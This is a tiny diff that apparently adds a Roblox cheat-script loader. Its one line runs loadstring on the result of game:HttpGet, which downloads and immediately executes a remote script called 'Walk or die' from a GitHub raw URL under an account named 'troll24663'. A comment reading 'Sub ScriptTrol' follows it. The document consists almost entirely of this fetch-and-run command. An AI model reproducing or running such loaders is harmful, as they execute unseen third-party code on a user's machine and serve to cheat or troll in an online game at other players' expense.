@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/troll24663/script/refs/heads/main/Walk%20or%20die"))()
+
+-- Sub ScriptTrol
